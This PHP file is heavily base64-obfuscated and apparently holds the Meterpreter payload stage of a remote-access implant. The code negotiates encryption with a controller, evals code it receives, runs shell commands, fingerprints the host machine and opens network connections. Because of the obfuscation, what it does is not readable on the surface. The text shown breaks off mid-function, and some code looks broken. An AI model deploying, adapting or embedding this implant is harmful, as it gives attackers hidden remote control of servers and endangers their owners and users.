<?php if(!isset($GLOBALS[base64_decode('Y2hhbm5lbHM=')])){$GLOBALS[base64_decode('Y2hhbm5lbHM=')]=array();}if(!isset($GLOBALS[base64_decode('Y2hhbm5lbF9wcm9jZXNzX21hcA==')])){$GLOBALS[base64_decode('Y2hhbm5lbF9wcm9jZXNzX21hcA==')]=array();}if(!isset($GLOBALS[base64_decode('cmVzb3VyY2VfdHlwZV9tYXA=')])){$GLOBALS[base64_decode('cmVzb3VyY2VfdHlwZV9tYXA=')]=array();}if(!isset($GLOBALS[base64_decode('dWRwX2hvc3RfbWFw')])){$GLOBALS[base64_decode('dWRwX2hvc3RfbWFw')]=array();}if(!isset($GLOBALS[base64_decode('cmVhZGVycw==')])){$GLOBALS[base64_decode('cmVhZGVycw==')]=array();}if(!isset($GLOBALS[base64_decode('Y29tbWFuZHM=')])){$GLOBALS[base64_decode('Y29tbWFuZHM=')]=array(base64_decode('Y29yZV9sb2FkbGli'),base64_decode('Y29yZV9tYWNoaW5lX2lk'),base64_decode('Y29yZV9zZXRfdXVpZA=='),base64_decode('Y29yZV9zZXRfc2Vzc2lvbl9ndWlk'),base64_decode('Y29yZV9nZXRfc2Vzc2lvbl9ndWlk'),base64_decode('Y29yZV9uZWdvdGlhdGVfdGx2X2VuY3J5cHRpb24='));}function m0($h3e){global $g3f;if(!in_array($h3e,$g3f)){array_push($g3f,$h3e);}}function e1($i40){}e1(base64_decode('RXZhbGluZyBtYWluIG1ldGVycHJldGVyIHN0YWdl'));function k2($u41,$d42=null){if(is_null($d42)){$d42=base64_decode('QXJyYXk=');}e1(sprintf("$d42 (%s)",count($u41)));foreach($u41 as $d43=>$j44){if(is_array($j44)){k2($j44,"{$d42}[{$d43}]");}else{e1(sprintf(" $d43 ($j44)"));}}}function u3(){global $o45;k2($o45,base64_decode('UmVhZGVycw=='));}function d4(){global $o46;k2($o46,base64_decode('UmVzb3VyY2UgbWFw'));}function w5($f47=''){global $n48;k2($n48,base64_decode('Q2hhbm5lbHMg').$f47);}if(!function_exists(base64_decode('ZmlsZV9nZXRfY29udGVudHM='))){function y6($a49){$f4a=@fopen($a49,base64_decode('cmI='));$y4b=false;if($f4a){do{$y4b.=fgets($f4a);}while(!feof($f4a));}fclose($f4a);return $y4b;}}if(!function_exists(base64_decode('c29ja2V0X3NldF9vcHRpb24='))){function d7($s4c,$m4d,$f4e,$d4f){i50($s4c,$m4d,$f4e,$d4f);}}define(base64_decode('UEFZTE9BRF9VVUlE'),base64_decode('1Qn/Cp1BLBFYp0uoBssq+w=='));define(base64_decode('U0VTU0lPTl9HVUlE'),base64_decode('AAAAAAAAAAAAAAAAAAAAAA=='));define(base64_decode('QUVTXzI1Nl9DQkM='),base64_decode('YWVzLTI1Ni1jYmM='));define(base64_decode('RU5DX05PTkU='),0);define(base64_decode('RU5DX0FFUzI1Ng=='),1);define(base64_decode('UEFDS0VUX1RZUEVfUkVRVUVTVA=='),0);define(base64_decode('UEFDS0VUX1RZUEVfUkVTUE9OU0U='),1);define(base64_decode('UEFDS0VUX1RZUEVfUExBSU5fUkVRVUVTVA=='),10);define(base64_decode('UEFDS0VUX1RZUEVfUExBSU5fUkVTUE9OU0U='),11);define(base64_decode('RVJST1JfU1VDQ0VTUw=='),0);define(base64_decode('RVJST1JfRkFJTFVSRQ=='),1);define(base64_decode('Q0hBTk5FTF9DTEFTU19CVUZGRVJFRA=='),0);define(base64_decode('Q0hBTk5FTF9DTEFTU19TVFJFQU0='),1);define(base64_decode('Q0hBTk5FTF9DTEFTU19EQVRBR1JBTQ=='),2);define(base64_decode('Q0hBTk5FTF9DTEFTU19QT09M'),3);define(base64_decode('VExWX01FVEFfVFlQRV9OT05F'),(0));define(base64_decode('VExWX01FVEFfVFlQRV9TVFJJTkc='),(1<<16));define(base64_decode('VExWX01FVEFfVFlQRV9VSU5U'),(1<<17));define(base64_decode('VExWX01FVEFfVFlQRV9SQVc='),(1<<18));define(base64_decode('VExWX01FVEFfVFlQRV9CT09M'),(1<<19));define(base64_decode('VExWX01FVEFfVFlQRV9RV09SRA=='),(1<<20));define(base64_decode('VExWX01FVEFfVFlQRV9DT01QUkVTU0VE'),(1<<29));define(base64_decode('VExWX01FVEFfVFlQRV9HUk9VUA=='),(1<<30));define(base64_decode('VExWX01FVEFfVFlQRV9DT01QTEVY'),(1<<31));define(base64_decode('VExWX01FVEFfVFlQRV9NQVNL'),(1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16));define(base64_decode('VExWX1JFU0VSVkVE'),0);define(base64_decode('VExWX0VYVEVOU0lPTlM='),20000);define(base64_decode('VExWX1VTRVI='),40000);define(base64_decode('VExWX1RFTVA='),60000);define(base64_decode('VExWX1RZUEVfQU5Z'),TLV_META_TYPE_NONE|0);define(base64_decode('VExWX1RZUEVfTUVUSE9E'),TLV_META_TYPE_STRING|1);define(base64_decode('VExWX1RZUEVfUkVRVUVTVF9JRA=='),TLV_META_TYPE_STRING|2);define(base64_decode('VExWX1RZUEVfRVhDRVBUSU9O'),TLV_META_TYPE_GROUP|3);define(base64_decode('VExWX1RZUEVfUkVTVUxU'),TLV_META_TYPE_UINT|4);define(base64_decode('VExWX1RZUEVfU1RSSU5H'),TLV_META_TYPE_STRING|10);define(base64_decode('VExWX1RZUEVfVUlOVA=='),TLV_META_TYPE_UINT|11);define(base64_decode('VExWX1RZUEVfQk9PTA=='),TLV_META_TYPE_BOOL|12);define(base64_decode('VExWX1RZUEVfTEVOR1RI'),TLV_META_TYPE_UINT|25);define(base64_decode('VExWX1RZUEVfREFUQQ=='),TLV_META_TYPE_RAW|26);define(base64_decode('VExWX1RZUEVfRkxBR1M='),TLV_META_TYPE_UINT|27);define(base64_decode('VExWX1RZUEVfQ0hBTk5FTF9JRA=='),TLV_META_TYPE_UINT|50);define(base64_decode('VExWX1RZUEVfQ0hBTk5FTF9UWVBF'),TLV_META_TYPE_STRING|51);define(base64_decode('VExWX1RZUEVfQ0hBTk5FTF9EQVRB'),TLV_META_TYPE_RAW|52);define(base64_decode('VExWX1RZUEVfQ0hBTk5FTF9EQVRBX0dST1VQ'),TLV_META_TYPE_GROUP|53);define(base64_decode('VExWX1RZUEVfQ0hBTk5FTF9DTEFTUw=='),TLV_META_TYPE_UINT|54);define(base64_decode('VExWX1RZUEVfU0VFS19XSEVOQ0U='),TLV_META_TYPE_UINT|70);define(base64_decode('VExWX1RZUEVfU0VFS19PRkZTRVQ='),TLV_META_TYPE_UINT|71);define(base64_decode('VExWX1RZUEVfU0VFS19QT1M='),TLV_META_TYPE_UINT|72);define(base64_decode('VExWX1RZUEVfRVhDRVBUSU9OX0NPREU='),TLV_META_TYPE_UINT|300);define(base64_decode('VExWX1RZUEVfRVhDRVBUSU9OX1NUUklORw=='),TLV_META_TYPE_STRING|301);define(base64_decode('VExWX1RZUEVfTElCUkFSWV9QQVRI'),TLV_META_TYPE_STRING|400);define(base64_decode('VExWX1RZUEVfVEFSR0VUX1BBVEg='),TLV_META_TYPE_STRING|401);define(base64_decode('VExWX1RZUEVfTUFDSElORV9JRA=='),TLV_META_TYPE_STRING|460);define(base64_decode('VExWX1RZUEVfVVVJRA=='),TLV_META_TYPE_RAW|461);define(base64_decode('VExWX1RZUEVfU0VTU0lPTl9HVUlE'),TLV_META_TYPE_RAW|462);define(base64_decode('VExWX1RZUEVfUlNBX1BVQl9LRVk='),TLV_META_TYPE_STRING|550);define(base64_decode('VExWX1RZUEVfU1lNX0tFWV9UWVBF'),TLV_META_TYPE_UINT|551);define(base64_decode('VExWX1RZUEVfU1lNX0tFWQ=='),TLV_META_TYPE_RAW|552);define(base64_decode('VExWX1RZUEVfRU5DX1NZTV9LRVk='),TLV_META_TYPE_RAW|553);function d8($e51){return shell_exec($e51);}function b9(){return(strtoupper(substr(PHP_OS,0,3))==base64_decode('V0lO'));}function pa($j52,&$j53){$g54=t31($j52,TLV_TYPE_CHANNEL_TYPE);e1(base64_decode('Q2xpZW50IHdhbnRzIGEg').$g54[base64_decode('dmFsdWU=')].base64_decode('IGNoYW5uZWwsIGknbGwgc2VlIHdoYXQgaSBjYW4gZG8='));$h55=base64_decode('Y2hhbm5lbF9jcmVhdGVf').$g54[base64_decode('dmFsdWU=')];if($g54[base64_decode('dmFsdWU=')]&&is_callable($h55)){e1("Calling {$h55}");$i56=$h55($j52,$j53);}else{e1(base64_decode('SSBkb24ndCBrbm93IGhvdyB0byBtYWtlIGEg').$g54[base64_decode('dmFsdWU=')].base64_decode('IGNoYW5uZWwuID0o'));$i56=ERROR_FAILURE;}return $i56;}function qb($j52,&$j53){e1(base64_decode('ZG9pbmcgY2hhbm5lbCBlb2Y='));$i57=t31($j52,TLV_TYPE_CHANNEL_ID);$h3e=g1e($i57[base64_decode('dmFsdWU=')]);if($h3e){if(q36($h3e[1])){d30($j53,q2d(TLV_TYPE_BOOL,1));}else{d30($j53,q2d(TLV_TYPE_BOOL,0));}return ERROR_SUCCESS;}else{return ERROR_FAILURE;}}function dc($j52,&$j53){e1(base64_decode('ZG9pbmcgY2hhbm5lbCByZWFk'));$i57=t31($j52,TLV_TYPE_CHANNEL_ID);$l58=t31($j52,TLV_TYPE_LENGTH);$x59=$i57[base64_decode('dmFsdWU=')];$j5a=$l58[base64_decode('dmFsdWU=')];$m5b=c20($x59,$j5a);if($m5b===false){$l5c=ERROR_FAILURE;}else{d30($j53,q2d(TLV_TYPE_CHANNEL_DATA,$m5b));$l5c=ERROR_SUCCESS;}return $l5c;}function hd($j52,&$j53){$i57=t31($j52,TLV_TYPE_CHANNEL_ID);$f5d=t31($j52,TLV_TYPE_CHANNEL_DATA);$l58=t31($j52,TLV_TYPE_LENGTH);$x59=$i57[base64_decode('dmFsdWU=')];$m5b=$f5d[base64_decode('dmFsdWU=')];$j5a=$l58[base64_decode('dmFsdWU=')];$e5e=w1f($x59,$m5b,$j5a);if($e5e===false){return ERROR_FAILURE;}else{d30($j53,q2d(TLV_TYPE_LENGTH,$e5e));return ERROR_SUCCESS;}}function je($j52,&$j53){global $u5f;e1(base64_decode('ZG9pbmcgY2hhbm5lbCBjbG9zZQ=='));$i57=t31($j52,TLV_TYPE_CHANNEL_ID);$x59=$i57[base64_decode('dmFsdWU=')];$h3e=g1e($x59);if($h3e){xf($x59);j10($x59);if(array_key_exists($x59,$u5f)and is_callable(base64_decode('Y2xvc2VfcHJvY2Vzcw=='))){j60($u5f[$x59]);}return ERROR_SUCCESS;}w5(base64_decode('YWZ0ZXIgY2xvc2U='));return ERROR_FAILURE;}function xf($u61){global $n48;if(!array_key_exists($u61,$n48)){return;}$h3e=$n48[$u61];for($p62=0;$p62<3;$p62++){if(array_key_exists($p62,$h3e)&&is_resource($h3e[$p62])){e37($h3e[$p62]);y3d($h3e[$p62]);}}if(strlen($h3e[base64_decode('ZGF0YQ==')])==0){j10($u61);}}function j10($u61){global $n48;unset($n48[$u61]);}function r11($j52,&$j53){global $o45;e1(base64_decode('ZG9pbmcgY2hhbm5lbCBpbnRlcmFjdA=='));$i57=t31($j52,TLV_TYPE_CHANNEL_ID);$x59=$i57[base64_decode('dmFsdWU=')];$p63=t31($j52,TLV_TYPE_BOOL);$h3e=g1e($x59);if($h3e){if($p63[base64_decode('dmFsdWU=')]){if(!in_array($h3e[1],$o45)){f3c($h3e[1]);if(array_key_exists(2,$h3e)&&$h3e[1]!=$h3e[2]){f3c($h3e[2]);}$i56=ERROR_SUCCESS;}else{$i56=ERROR_FAILURE;}}else{if(in_array($h3e[1],$o45)){y3d($h3e[1]);y3d($h3e[2]);$i56=ERROR_SUCCESS;}else{$i56=ERROR_SUCCESS;}}}else{e1(base64_decode('VHJ5aW5nIHRvIGludGVyYWN0IHdpdGggYW4gaW52YWxpZCBjaGFubmVs'));$i56=ERROR_FAILURE;}return $i56;}function e12($u61){global $o45;$h3e=g1e($u61);if(in_array($h3e[1],$o45)){return true;}return false;}function r13($j52,&$j53){e1(base64_decode('ZG9pbmcgY29yZSBzaHV0ZG93bg=='));die();}function j14($j52,&$j53){global $g3f;e1(base64_decode('ZG9pbmcgY29yZV9sb2FkbGli'));$f5d=t31($j52,TLV_TYPE_DATA);if(($f5d[base64_decode('dHlwZQ==')]&TLV_META_TYPE_COMPRESSED)==TLV_META_TYPE_COMPRESSED){return ERROR_FAILURE;}$z64=$g3f;if(extension_loaded(base64_decode('c3Vob3Npbg=='))&&ini_get(base64_decode('c3Vob3Npbi5leGVjdXRvci5kaXNhYmxlX2V2YWw='))){$m65=create_function('',$f5d[base64_decode('dmFsdWU=')]);$m65();}else{eval($f5d[base64_decode('dmFsdWU=')]);}$e66=array_diff($g3f,$z64);foreach($e66 as $y67){d30($j53,q2d(TLV_TYPE_METHOD,$y67));}return ERROR_SUCCESS;}function o15($j52,&$j53){e1(base64_decode('ZG9pbmcgY29yZV9lbnVtZXh0Y21k'));global $g3f;$c68=t31($j52,TLV_TYPE_STRING);;$f69=$c68[base64_decode('dmFsdWU=')];foreach($g3f as $n6a){list($h6b,$e51)=explode(base64_decode('Xw=='),$n6a,2);if($h6b==$f69){d30($j53,q2d(TLV_TYPE_STRING,$e51));}}return ERROR_SUCCESS;}function u16($j52,&$j53){e1(base64_decode('ZG9pbmcgY29yZV9zZXRfdXVpZA=='));$p6c=t31($j52,TLV_TYPE_UUID);if($p6c!=null){$GLOBALS[base64_decode('VVVJRA==')]=$p6c[base64_decode('dmFsdWU=')];e1("New UUID is {$GLOBALS[base64_decode('VVVJRA==')]}");}return ERROR_SUCCESS;}function z17(){foreach(scandir(base64_decode('L2Rldi9kaXNrL2J5LWlkLw=='))as $a49){foreach(array(base64_decode('YXRhLQ=='),base64_decode('bWIt'))as $j6d){if(strpos($a49,$j6d)===0){return substr($a49,strlen($j6d));}}}return '';}function a18($j52,&$j53){if(q26()){e1(base64_decode('QUVTIGZ1bmN0aW9uYWxpdHkgaXMgc3VwcG9ydGVk'));d30($j53,q2d(TLV_TYPE_SYM_KEY_TYPE,ENC_AES256));$GLOBALS[base64_decode('QUVTX0VOQUJMRUQ=')]=false;$GLOBALS[base64_decode('QUVTX0tFWQ==')]=z22(32);if(function_exists(base64_decode('b3BlbnNzbF9wa2V5X2dldF9wdWJsaWM='))&&function_exists(base64_decode('b3BlbnNzbF9wdWJsaWNfZW5jcnlwdA=='))){e1(base64_decode('RW5jcnlwdGlvbiB2aWEgcHVibGljIGtleSBpcyBzdXBwb3J0ZWQ='));$s6e=t31($j52,TLV_TYPE_RSA_PUB_KEY);if($s6e!=null){$d43=openssl_pkey_get_public($s6e[base64_decode('dmFsdWU=')]);$g6f='';openssl_public_encrypt($GLOBALS[base64_decode('QUVTX0tFWQ==')],$g6f,$d43,OPENSSL_PKCS1_PADDING);d30($j53,q2d(TLV_TYPE_ENC_SYM_KEY,$g6f));return ERROR_SUCCESS;}}d30($j53,q2d(TLV_TYPE_SYM_KEY,$GLOBALS[base64_decode('QUVTX0tFWQ==')]));}return ERROR_SUCCESS;}function e19($j52,&$j53){d30($j53,q2d(TLV_TYPE_SESSION_GUID,$GLOBALS[base64_decode('U0VTU0lPTl9HVUlE')]));return ERROR_SUCCESS;}function i1a($j52,&$j53){e1(base64_decode('ZG9pbmcgY29yZV9zZXRfc2Vzc2lvbl9ndWlk'));$y70=t31($j52,TLV_TYPE_SESSION_GUID);if($y70!=null){$GLOBALS[base64_decode('U0VTU0lPTl9JRA==')]=$y70[base64_decode('dmFsdWU=')];e1("New Session GUID is {$GLOBALS[base64_decode('U0VTU0lPTl9HVUlE')]}");}return ERROR_SUCCESS;}function s1b($j52,&$j53){e1(base64_decode('ZG9pbmcgY29yZV9tYWNoaW5lX2lk'));if(is_callable(base64_decode('Z2V0aG9zdG5hbWU='))){$g71=gethostname();}else{$g71=php_uname(base64_decode('bg=='));}$g72='';if(b9()){$d73=strtolower(shell_exec(base64_decode('dm9sICVTWVNURU1EUklWRSU=')));$g72=preg_replace(base64_decode('Ly4qc2VyaWFsIG51bWJlciBpcyAoW2EtejAtOV17NH0tW2EtejAtOV17NH0pLiovcw=='),base64_decode('JDE='),$d73);}else{$g72=z17();}d30($j53,q2d(TLV_TYPE_MACHINE_ID,$g72.base64_decode('Og==').$g71));return ERROR_SUCCESS;}$n48=array();function n1c($h74,$y75=null,$b76=null){global $n48;if($y75==null){$y75=$h74;}if($b76==null){$b76=$y75;}$n48[]=array(0=>$h74,1=>$y75,2=>$b76,base64_decode('dHlwZQ==')=>t3a($h74),base64_decode('ZGF0YQ==')=>'');$x59=end(array_keys($n48));e1("Created new channel $h74, with id $x59");return $x59;}function q1d($k77){global $n48;if(empty($n48)){return false;}foreach($n48 as $p62=>$y78){if(in_array($k77,$y78)){e1("Found channel id $p62");return $p62;}}return false;}function&g1e($w79){global $n48;e1("Looking up channel id $w79");if(array_key_exists($w79,$n48)){e1(base64_decode('Rm91bmQgb25l'));return $n48[$w79];}else{return false;}}function w1f($w79,$m5b){$h3e=g1e($w79);if($h3e&&is_resource($h3e[0])){e1("---Writing '$m5b' to channel $w79");return q39($h3e[0],$m5b);}else{return false;}}function c20($w79,$j5a){$h3e=&g1e($w79);if($h3e){$i56=substr($h3e[base64_decode('ZGF0YQ==')],0,$j5a);$h3e[base64_decode('ZGF0YQ==')]=substr($h3e[base64_decode('ZGF0YQ==')],$j5a);if(strlen($i56)>0){e1("Had some leftovers: '$i56'");}if(strlen($i56)<$j5a and is_resource($h3e[2])and $h3e[1]!=$h3e[2]){$y7a=y38($h3e[2]);$h3e[base64_decode('ZGF0YQ==')].=$y7a;$k7b=$j5a-strlen($i56);$i56.=substr($h3e[base64_decode('ZGF0YQ==')],0,$k7b);$h3e[base64_decode('ZGF0YQ==')]=substr($h3e[base64_decode('ZGF0YQ==')],$k7b);}if(strlen($i56)<$j5a and is_resource($h3e[1])){$y7a=y38($h3e[1]);$h3e[base64_decode('ZGF0YQ==')].=$y7a;$k7b=$j5a-strlen($i56);$i56.=substr($h3e[base64_decode('ZGF0YQ==')],0,$k7b);$h3e[base64_decode('ZGF0YQ==')]=substr($h3e[base64_decode('ZGF0YQ==')],$k7b);}if(false===$y7a and empty($i56)){if(e12($w79)){c2a($h3e[1]);}return false;}return $i56;}else{return false;}}function x21(){return chr(mt_rand(1,255));}function z22($d7c){$h7d='';for($p62=0;$p62<$d7c;$p62++){$h7d.=x21();}return $h7d;}function d23(){return z22(4);}function p24($d43,$m5b){$p7e='';for($p62=0;$p62<strlen($m5b);++$p62){$p7e.=$m5b{$p62}^$d43{$p62%4};}return $p7e;}function a25(){$q7f=base64_decode('YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo=');$l80='';for($g81=0;$g81<32;$g81++){$l80.=$q7f[rand(0,strlen($q7f)-1)];}return $l80;}function q26(){return function_exists(base64_decode('b3BlbnNzbF9kZWNyeXB0'))&&function_exists(base64_decode('b3BlbnNzbF9lbmNyeXB0'));}function e27($u82){$s83=unpack(base64_decode('Tmxlbg=='),substr($u82,20,4));$e84=$s83[base64_decode('bGVu')];if($e84==ENC_AES256&&q26()&&$GLOBALS[base64_decode('QUVTX0tFWQ==')]!=null){$i85=substr($u82,24);$y86=openssl_decrypt(substr($i85,24),AES_256_CBC,$GLOBALS[base64_decode('QUVTX0tFWQ==')],OPENSSL_RAW_DATA,substr($i85,8,16));return pack(base64_decode('Tg=='),strlen($y86)+8).substr($i85,4,4).$y86;}return substr($u82,24);}function m28($u82){if(q26()&&$GLOBALS[base64_decode('QUVTX0tFWQ==')]!=null){if($GLOBALS[base64_decode('QUVTX0VOQUJMRUQ=')]===true){$m87=z22(16);$g6f=$m87.openssl_encrypt(substr($u82,8),AES_256_CBC,$GLOBALS[base64_decode('QUVTX0tFWQ==')],OPENSSL_RAW_DATA,$m87);$j88=pack(base64_decode('Tg=='),strlen($g6f)+8).substr($u82,4,4);return $GLOBALS[base64_decode('U0VTU0lPTl9HVUlE')].pack(base64_decode('Tg=='),ENC_AES256).$j88.$g6f;}$GLOBALS[base64_decode('QUVTX0VOQUJMRUQ=')]=true;}return $GLOBALS[base64_decode('U0VTU0lPTl9HVUlE')].pack(base64_decode('Tg=='),ENC_NONE).$u82;}function q29($k77,$u82){$s89=d23();q39($k77,$s89.p24($s89,m28($u82)));}function c2a($k77){global $m8a;if(!is_resource($k77)){return;}$u61=q1d($k77);if($u61===false){e1("Resource has no channel: {$k77}");y3d($k77);e37($k77);}else{e1("Handling dead resource: {$k77}, for channel: {$u61}");xf($u61);$j53=pack(base64_decode('Tg=='),PACKET_TYPE_REQUEST);d30($j53,q2d(TLV_TYPE_METHOD,base64_decode('Y29yZV9jaGFubmVsX2Nsb3Nl')));d30($j53,q2d(TLV_TYPE_REQUEST_ID,a25()));d30($j53,q2d(TLV_TYPE_CHANNEL_ID,$u61));d30($j53,q2d(TLV_TYPE_UUID,$GLOBALS[base64_decode('VVVJRA==')]));$j53=pack(base64_decode('Tg=='),strlen($j53)+4).$j53;q29($m8a,$j53);}}function v2b($k77,$m5b){global $u8b;$u61=q1d($k77);e1("Handling data from $k77");$j53=pack(base64_decode('Tg=='),PACKET_TYPE_REQUEST);d30($j53,q2d(TLV_TYPE_METHOD,base64_decode('Y29yZV9jaGFubmVsX3dyaXRl')));if(array_key_exists((int)$k77,$u8b)){list($l8c,$g81)=$u8b[(int)$k77];d30($j53,q2d(TLV_TYPE_PEER_HOST,$l8c));d30($j53,q2d(TLV_TYPE_PEER_PORT,$g81));}d30($j53,q2d(TLV_TYPE_CHANNEL_ID,$u61));d30($j53,q2d(TLV_TYPE_CHANNEL_DATA,$m5b));d30($j53,q2d(TLV_TYPE_LENGTH,strlen($m5b)));d30($j53,q2d(TLV_TYPE_REQUEST_ID,a25()));d30($j53,q2d(TLV_TYPE_UUID,$GLOBALS[base64_decode('VVVJRA==')]));$j53=pack(base64_decode('Tg=='),strlen($j53)+4).$j53;return $j53;}function x2c($j52){$j53=pack(base64_decode('Tg=='),PACKET_TYPE_RESPONSE);$q8d=t31($j52,TLV_TYPE_METHOD);e1("method is {$q8d[base64_decode('dmFsdWU=')]}");d30($j53,$q8d);$z8e=t31($j52,TLV_TYPE_REQUEST_ID);d30($j53,$z8e);if(is_callable($q8d[base64_decode('dmFsdWU=')])){$p7e=$q8d[base64_decode('dmFsdWU=')]($j52,$j53);}else{e1(base64_decode('R290IGEgcmVxdWVzdCBmb3Igc29tZXRoaW5nIEkgZG9uJ3Qga25vdyBob3cgdG8gaGFuZGxlICg=').$q8d[base64_decode('dmFsdWU=')].base64_decode('KSwgcmV0dXJuaW5nIGZhaWx1cmU='));$p7e=ERROR_FAILURE;}d30($j53,q2d(TLV_TYPE_RESULT,$p7e));d30($j53,q2d(TLV_TYPE_UUID,$GLOBALS[base64_decode('VVVJRA==')]));$j53=pack(base64_decode('Tg=='),strlen($j53)+4).$j53;return $j53;}function q2d($m4d,$j44){returnarray(base64_decode('dHlwZQ==')=>$m4d,base64_decode('dmFsdWU=')=>$j44);}function v2e($i85){$i56='';if(($i85[base64_decode('dHlwZQ==')]&TLV_META_TYPE_STRING)==TLV_META_TYPE_STRING){$i56=pack(base64_decode('Tk5hKg=='),8+strlen($i85[base64_decode('dmFsdWU=')])+1,$i85[base64_decode('dHlwZQ==')],$i85[base64_decode('dmFsdWU=')].base64_decode('AA=='));}elseif(($i85[base64_decode('dHlwZQ==')]&TLV_META_TYPE_QWORD)==TLV_META_TYPE_QWORD){$v8f=($i85[base64_decode('dmFsdWU=')]>>32)&0xFFFFFFFF;$k90=$i85[base64_decode('dmFsdWU=')]&0xFFFFFFFF;$i56=pack(base64_decode('Tk5OTg=='),8+8,$i85[base64_decode('dHlwZQ==')],$v8f,$k90);}elseif(($i85[base64_decode('dHlwZQ==')]&TLV_META_TYPE_UINT)==TLV_META_TYPE_UINT){$i56=pack(base64_decode('Tk5O'),8+4,$i85[base64_decode('dHlwZQ==')],$i85[base64_decode('dmFsdWU=')]);}elseif(($i85[base64_decode('dHlwZQ==')]&TLV_META_TYPE_BOOL)==TLV_META_TYPE_BOOL){$i56=pack(base64_decode('Tk4='),8+1,$i85[base64_decode('dHlwZQ==')]);$i56.=$i85[base64_decode('dmFsdWU=')]?base64_decode('AQ=='):base64_decode('AA==');}elseif(($i85[base64_decode('dHlwZQ==')]&TLV_META_TYPE_RAW)==TLV_META_TYPE_RAW){$i56=pack(base64_decode('Tk4='),8+strlen($i85[base64_decode('dmFsdWU=')]),$i85[base64_decode('dHlwZQ==')]).$i85[base64_decode('dmFsdWU=')];}elseif(($i85[base64_decode('dHlwZQ==')]&TLV_META_TYPE_GROUP)==TLV_META_TYPE_GROUP){$i56=pack(base64_decode('Tk4='),8+strlen($i85[base64_decode('dmFsdWU=')]),$i85[base64_decode('dHlwZQ==')]).$i85[base64_decode('dmFsdWU=')];}elseif(($i85[base64_decode('dHlwZQ==')]&TLV_META_TYPE_COMPLEX)==TLV_META_TYPE_COMPLEX){$i56=pack(base64_decode('Tk4='),8+strlen($i85[base64_decode('dmFsdWU=')]),$i85[base64_decode('dHlwZQ==')]).$i85[base64_decode('dmFsdWU=')];}else{e1(base64_decode('RG9uJ3Qga25vdyBob3cgdG8gbWFrZSBhIHRsdiBvZiB0eXBlIA==').$i85[base64_decode('dHlwZQ==')].base64_decode('IChtZXRhIHR5cGUg').sprintf(base64_decode('JTA4eA=='),$i85[base64_decode('dHlwZQ==')]&TLV_META_TYPE_MASK).base64_decode('KSwgd3Rm'));}return $i56;}function c2f($j91){$i85=unpack(base64_decode('Tmxlbi9OdHlwZQ=='),substr($j91,0,8));$m4d=$i85[base64_decode('dHlwZQ==')];e1("len: {$i85[base64_decode('bGVu')]}, type: {$i85[base64_decode('dHlwZQ==')]}");if(($m4d&TLV_META_TYPE_STRING)==TLV_META_TYPE_STRING){$i85=unpack(base64_decode('Tmxlbi9OdHlwZS9hKnZhbHVl'),substr($j91,0,$i85[base64_decode('bGVu')]));$i85[base64_decode('dmFsdWU=')]=str_replace(base64_decode('AA=='),'',$i85[base64_decode('dmFsdWU=')]);}elseif(($m4d&TLV_META_TYPE_UINT)==TLV_META_TYPE_UINT){$i85=unpack(base64_decode('Tmxlbi9OdHlwZS9OdmFsdWU='),substr($j91,0,$i85[base64_decode('bGVu')]));}elseif(($m4d&TLV_META_TYPE_QWORD)==TLV_META_TYPE_QWORD){$i85=unpack(base64_decode('Tmxlbi9OdHlwZS9OaGkvTmxv'),substr($j91,0,$i85[base64_decode('bGVu')]));$i85[base64_decode('dmFsdWU=')]=$i85[base64_decode('aGk=')]<<32|$i85[base64_decode('bG8=')];}elseif(($m4d&TLV_META_TYPE_BOOL)==TLV_META_TYPE_BOOL){$i85=unpack(base64_decode('Tmxlbi9OdHlwZS9jdmFsdWU='),substr($j91,0,$i85[base64_decode('bGVu')]));}elseif(($m4d&TLV_META_TYPE_RAW)==TLV_META_TYPE_RAW){$i85=unpack(base64_decode('Tmxlbi9OdHlwZQ=='),$j91);$i85[base64_decode('dmFsdWU=')]=substr($j91,8,$i85[base64_decode('bGVu')]-8);}else{e1("Wtf type is this? $m4d");$i85=null;}return $i85;}function d30(&$j53,$i85){$j53.=v2e($i85);}function t31($j53,$m4d){$k92=8;while($k92<strlen($j53)){$i85=c2f(substr($j53,$k92));if($m4d==($i85[base64_decode('dHlwZQ==')]&~TLV_META_TYPE_COMPRESSED)){return $i85;}$k92+=$i85[base64_decode('bGVu')];}return null;}function r32($j53,$m4d){e1("Looking for all tlvs of type $m4d");$k92=8;$m93=array();while($k92<strlen($j53)){$i85=c2f(substr($j53,$k92));if($i85==NULL){break;}e1("len: {$i85[base64_decode('bGVu')]}, type: {$i85[base64_decode('dHlwZQ==')]}");if(empty($m4d)||$m4d==($i85[base64_decode('dHlwZQ==')]&~TLV_META_TYPE_COMPRESSED)){e1("Found one at offset $k92");array_push($m93,$i85);}$k92+=$i85[base64_decode('bGVu')];}return $m93;}function c33($s4c,$t94=null,$n95=null){global $o46,$u8b;e1("Registering socket $s4c for ($t94:$n95)");$o46[(int)$s4c]=base64_decode('c29ja2V0');if($t94){$u8b[(int)$s4c]=array($t94,$n95);}}function x34($d96,$t94=null,$n95=null){global $o46,$u8b;e1("Registering stream $d96 for ($t94:$n95)");$o46[(int)$d96]=base64_decode('c3RyZWFt');if($t94){$u8b[(int)$d96]=array($t94,$n95);}}function n35($t94,$n95,$n97=base64_decode('dGNw')){e1("Doing connect($t94, $n95)");$s4c=false;$d98=AF_INET;$q99=$t94;if(FALSE!==strpos($t94,base64_decode('Og=='))){$d98=AF_INET6;$t94=base64_decode('Ww==').$q99.base64_decode('XQ==');}if(is_callable(base64_decode('c3RyZWFtX3NvY2tldF9jbGllbnQ='))){e1("stream_socket_client({$n97}://{$t94}:{$n95})");if($n97==base64_decode('c3Ns')){$s4c=stream_socket_client("ssl://{$t94}:{$n95}",$b9a,$e9b,5,STREAM_CLIENT_ASYNC_CONNECT);if(!$s4c){return false;}stream_set_blocking($s4c,0);x34($s4c);}elseif($n97==base64_decode('dGNw')){$s4c=stream_socket_client("tcp://{$t94}:{$n95}");if(!$s4c){return false;}x34($s4c);}elseif($n97==base64_decode('dWRw')){$s4c=stream_socket_client("udp://{$t94}:{$n95}");if(!$s4c){return false;}x34($s4c,$t94,$n95);}}else if(is_callable(base64_decode('ZnNvY2tvcGVu'))){e1(base64_decode('ZnNvY2tvcGVu'));if($n97==base64_decode('c3Ns')){$s4c=fsockopen("ssl://{$t94}:{$n95}");stream_set_blocking($s4c,0);x34($s4c);}elseif($n97==base64_decode('dGNw')){$s4c=fsockopen($t94,$n95);if(!$s4c){return 